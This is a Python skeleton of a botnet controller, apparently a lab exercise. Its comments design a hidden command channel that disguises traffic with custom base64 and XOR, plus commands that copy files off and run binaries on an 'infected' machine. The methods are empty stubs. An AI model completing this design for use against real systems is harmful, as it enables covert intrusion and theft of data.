import argparse

# This is the only instance of the controller that the bot will listen to
# The bot can receive other commands from other services but it will ignore them
# if they do not show the correct authentication logic

''' 
The validation / authenticion logic has the following function:
   It is for the bot to decide with high confidence that the command is meant for it. 
   Bot must recognize commands only from the controller.
   The commands must be statistically indistinguishable from normal traffic in the topic (REQUIREMENT! STAY HIDDEN).
   Make sure that any accidental triggers are minimized. 

   Conceptual frame:
   | MAGIC | VERSION | TYPE | LENGTH | AUTH | PAYLOAD | CHECKSUM |
    - MAGIC: a predefined short sequence of bytes that indicates the start of a command
    - VERSION: a byte indicating the version of the protocol
    - TYPE: a byte indicating the type of command (e.g., announce, list-users, ...)
    - LENGTH: a short integer indicating the length of the PAYLOAD
    - AUTH: an authentication field (e.g., HMAC, signature)
    - PAYLOAD: the actual command data
    - CHECKSUM: a checksum for integrity verification 

    The bot will verify these leveles one by one and if one fails, it will discard the message.


    Authentication logic:
    - Command-bound MAC: AUTH = hash(secret_key =| payload) -> Payload can't be tampered with
    - The bot and controller share a secret key known only to them.

    Encoding:
    - Non-standard base64 alphabet
    - XOR stream with rotating key

'''
class BotController:
    def __init__(self):
        pass

    def _build_frame(self):
        pass
    
    def _encode_frame(self):
        pass

    def _publish_frame(self):
        pass

    def _decode_frame(self):
        pass

def main():
    parser = argparse.ArgumentParser(description="Bot Controller")
    #1. announcing the presence of the bot to the controller if asked.
    parser.add_argument("--announce", type=str, required=False)
    #2. listing users currently logged in the "infected" device (output of 'w' command).
    parser.add_argument("--list-users", action="store_true", required=False)
    #3. listing content of a specified directory (output of 'ls' command). The directory is a parameter specified in the controller's command.
    parser.add_argument("--list-dir", type=str, required=False)
    #4. id of the user running the bot (output of 'id command').
    parser.add_argument("--user-id", action="store_true", required=False)
    #5. copying of a file from the "infected machine" to the controller (file path is a parameter specified by the controller).
    parser.add_argument("--copy-file", type=str, required=False)
    #6. executing a binary inside the "infected machine" specified by the controller (e.g. '/usr/bin/ps').
    parser.add_argument("--exec-binary", type=str, required=False)

    args = parser.parse_args()
    print("Parsed arguments:", args)

if __name__ == "__main__":
    main()
